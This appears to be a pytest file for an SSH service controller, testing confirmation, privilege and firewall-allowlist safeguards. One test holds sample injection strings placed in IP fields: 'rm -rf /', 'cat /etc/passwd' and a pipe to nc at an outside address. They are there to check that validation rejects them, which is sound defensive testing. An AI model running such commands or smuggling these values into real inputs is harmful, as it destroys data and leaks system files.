"""Unit tests for SSH Service Controller safeguards and privileged actions."""

import pytest
from unittest.mock import MagicMock, patch

from labguard_ssh.config import SSHModuleSettings
from labguard_ssh.models import AllowlistApplyRequest, DisableSSHRequest
from labguard_ssh.service_controller import (
    ControllerSecurityError,
    SSHServiceController,
    LOCKOUT_WARNING,
)


@pytest.fixture
def controller():
    settings = SSHModuleSettings(
        allow_privileged_operations=True,
    )
    return SSHServiceController(settings=settings)


def test_disable_ssh_requires_confirmation(controller):
    """Operation rejected when confirm=False."""
    req = DisableSSHRequest(confirm=False, acknowledged_lockout_risk=True)
    with pytest.raises(ControllerSecurityError, match="Explicit 'confirm=true' is required"):
        controller.disable_ssh_service(req)


def test_disable_ssh_requires_lockout_acknowledgment(controller):
    """Operation rejected when lockout risk is not acknowledged."""
    req = DisableSSHRequest(confirm=True, acknowledged_lockout_risk=False)
    with pytest.raises(ControllerSecurityError, match="Lockout risk must be explicitly acknowledged"):
        controller.disable_ssh_service(req)


def test_disable_ssh_master_switch_safety():
    """Operation rejected when allow_privileged_operations is False."""
    safe_settings = SSHModuleSettings(allow_privileged_operations=False)
    ctrl = SSHServiceController(settings=safe_settings)
    req = DisableSSHRequest(confirm=True, acknowledged_lockout_risk=True)

    with pytest.raises(ControllerSecurityError, match="LABGUARD_ALLOW_PRIVILEGED_OPERATIONS is set to False"):
        ctrl.disable_ssh_service(req)


def test_disable_ssh_requires_root(controller):
    """Operation rejected when process does not have root EUID."""
    req = DisableSSHRequest(confirm=True, acknowledged_lockout_risk=True)
    with patch.object(controller, "is_root", return_value=False):
        with pytest.raises(ControllerSecurityError, match="Insufficient privileges"):
            controller.disable_ssh_service(req)


def test_disable_ssh_success_flow(controller):
    """Successful mock execution stops and disables service without uninstalling OpenSSH."""
    req = DisableSSHRequest(confirm=True, acknowledged_lockout_risk=True, reason="Lab maintenance")

    with patch.object(controller, "is_root", return_value=True), \
         patch("shutil.which", return_value="/bin/systemctl"), \
         patch.object(controller, "run_command", return_value=(0, "ok", "")) as mock_cmd:

        resp = controller.disable_ssh_service(req, service_name="ssh")

        assert resp.success is True
        assert resp.operation == "DISABLE_SSH"
        assert resp.details.get("uninstalled") is False  # Never uninstalls package
        assert any("Stopping SSH will prevent NEW SSH connections" in w for w in resp.warnings)
        assert any("Active established SSH sessions are NOT terminated" in w for w in resp.warnings)

        # Verify command arguments passed as safe lists
        assert mock_cmd.call_count == 2
        mock_cmd.assert_any_call(["systemctl", "stop", "ssh.service"])
        mock_cmd.assert_any_call(["systemctl", "disable", "ssh.service"])


def test_plan_allowlist_preserves_existing_rules(controller):
    """Allowlist planning preserves existing rules and produces additive proposals."""
    with patch.object(controller, "inspect_firewall", return_value=("ufw", ["1: allow 80/tcp", "2: allow 443/tcp"])):
        plan = controller.plan_allowlist(["192.168.1.50", "10.0.0.0/24"], port=22)
        assert plan.firewall_type == "ufw"
        assert plan.existing_rules_count == 2
        assert len(plan.proposed_rules) == 2
        assert plan.safe_to_apply is True
        assert all(r.preserves_existing is True for r in plan.proposed_rules)
        assert any("EXISTING RULES ARE PRESERVED" in w for w in plan.warnings)


def test_apply_allowlist_dry_run_executes_no_commands(controller):
    """Dry-run returns plan without executing any modifying commands."""
    req = AllowlistApplyRequest(
        confirm=True,
        recovery_method_confirmed=True,
        allowed_ips=["192.168.1.100"],
        dry_run=True,
    )
    with patch.object(controller, "inspect_firewall", return_value=("ufw", ["rule 1"])), \
         patch.object(controller, "run_command") as mock_cmd:

        resp = controller.apply_allowlist(req, port=22)
        assert resp.success is True
        assert resp.operation == "ALLOWLIST_DRY_RUN"
        # No system modify command should have been executed in dry-run
        mock_cmd.assert_not_called()


def test_apply_allowlist_requires_recovery_confirmation(controller):
    """Live application requires recovery_method_confirmed=True."""
    req = AllowlistApplyRequest(
        confirm=True,
        recovery_method_confirmed=False,
        allowed_ips=["192.168.1.100"],
        dry_run=False,
    )
    with patch.object(controller, "inspect_firewall", return_value=("ufw", [])):
        with pytest.raises(ControllerSecurityError, match="recovery console/access method is available"):
            controller.apply_allowlist(req, port=22)


def test_apply_allowlist_never_flushes_firewall(controller):
    """Verify live allowlist application executes additive rules and never flushes existing rules."""
    req = AllowlistApplyRequest(
        confirm=True,
        recovery_method_confirmed=True,
        allowed_ips=["192.168.1.50"],
        dry_run=False,
    )
    with patch.object(controller, "is_root", return_value=True), \
         patch.object(controller, "inspect_firewall", return_value=("ufw", ["1: allow 80"])), \
         patch.object(controller, "run_command", return_value=(0, "ok", "")) as mock_cmd:

        resp = controller.apply_allowlist(req, port=22)
        assert resp.success is True

        # Ensure all executed command argument lists are additive and never contain destructive flags
        for call_args in mock_cmd.call_args_list:
            cmd_list = call_args[0][0]
            assert "reset" not in cmd_list
            assert "-F" not in cmd_list
            assert "flush" not in cmd_list


def test_command_injection_rejected_by_ip_validation(controller):
    """Verify shell injection strings cannot be added to allowlist rules."""
    malicious_inputs = [
        "192.168.1.1; rm -rf /",
        "10.0.0.1 && cat /etc/passwd",
        "1.1.1.1 `whoami`",
        "127.0.0.1 | nc 1.2.3.4 9999",
    ]
    with patch.object(controller, "inspect_firewall", return_value=("ufw", [])):
        plan = controller.plan_allowlist(malicious_inputs, port=22)
        # All malicious inputs must be rejected by ipaddress validator
        assert len(plan.proposed_rules) == 0
        assert plan.safe_to_apply is False
        assert len(plan.warnings) >= len(malicious_inputs)


def test_disable_ssh_blocks_on_windows(controller):
    """Verify disable_ssh_service raises ControllerSecurityError on Windows."""
    req = DisableSSHRequest(confirm=True, acknowledged_lockout_risk=True)
    with patch.object(controller, "is_root", return_value=True), \
         patch("sys.platform", "win32"):
        with pytest.raises(ControllerSecurityError, match="Windows service modification is unsupported"):
            controller.disable_ssh_service(req)


